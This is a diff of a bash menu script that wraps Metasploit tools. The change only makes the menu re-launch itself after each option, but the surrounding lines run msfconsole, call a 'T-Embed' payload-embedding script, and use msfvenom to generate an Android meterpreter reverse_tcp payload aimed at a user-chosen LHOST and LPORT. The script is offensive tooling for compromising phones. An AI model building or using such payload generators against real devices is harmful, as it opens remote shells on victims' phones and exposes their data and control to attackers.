@@ -20,11 +20,14 @@ if [ $o = "3" ]
 then
 cd $metapath
 ./msfconsole
+./easy.sh
 break
 elif [ $o = "1" ]
 then
 cd T-Embed
 ./tembed.sh
+cd ..
+./easy.sh
 elif [ $o = "2" ]
 then
 cd $metapath
@@ -37,6 +40,7 @@ echo "where you want to save the payload to"
 read -p ">|" p2
 ./msfvenom -p android/meterpreter/reverse_tcp LHOST=$host1 LPORT=$port1 R > $p2
 cd ..
+./easy.sh
 elif [ $o = "4" ]
 then
 exit
